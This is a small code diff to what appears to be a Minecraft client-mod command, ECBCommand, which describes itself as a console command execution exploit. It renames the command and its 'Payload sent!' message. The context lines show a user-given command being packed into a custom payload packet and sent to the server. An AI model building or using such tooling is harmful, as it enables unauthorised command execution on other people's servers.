@@ -11,7 +11,7 @@ import net.minecraft.network.packet.c2s.common.CustomPayloadC2SPacket;
 
 public class ECBCommand extends Command {
     public ECBCommand(MinecraftClient minecraftClient) {
-        super("ecb", "Console command execution exploit", minecraftClient);
+        super("ecb-proxy-exploit", "Console command execution exploit", minecraftClient);
     }
 
     @Override
@@ -25,7 +25,7 @@ public class ECBCommand extends Command {
                         .executes(context -> {
                             Helper.sendPacket(new CustomPayloadC2SPacket(
                                     new ECBPayloadPacket(context.getArgument("command", String.class))));
-                            Helper.printChatMessage("Payload sent!");
+                            Helper.printChatMessage("ECB-Proxy-Exploit Payload sent!");
                             return SINGLE_SUCCESS;
                         })
                 );
